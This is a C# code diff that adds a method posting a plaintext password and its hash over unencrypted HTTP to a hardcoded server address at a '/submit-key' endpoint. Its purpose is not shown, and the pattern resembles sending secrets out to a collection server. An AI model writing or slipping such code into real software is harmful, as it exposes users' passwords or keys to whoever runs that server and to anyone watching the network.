@@ -34,6 +34,40 @@ class Program
             return BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
         }
     }
-}
 
-    
+    static async Task SendPasswordToServerAsync(string password, string hashedPassword)
+    {
+        string serverIP = "192.168.0.17"; // Server IP address or domain
+        int port = 3000;
+
+        using (var client = new HttpClient())
+        {
+            client.BaseAddress = new Uri($"http://{serverIP}:{port}");
+
+            var postData = new List<KeyValuePair<string, string>>
+            {
+                new KeyValuePair<string, string>("password", password),
+                new KeyValuePair<string, string>("hashedPassword", hashedPassword)
+            };
+
+            try
+            {
+                var response = await client.PostAsync("/submit-key", new FormUrlEncodedContent(postData));
+
+                if (response.IsSuccessStatusCode)
+                {
+                    string responseData = await response.Content.ReadAsStringAsync();
+                    Console.WriteLine($"Server response: {responseData}");
+                }
+                else
+                {
+                    Console.WriteLine($"Error sending data to server: {response.StatusCode}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error sending data to server: {ex.Message}");
+            }
+        }
+    }
+}
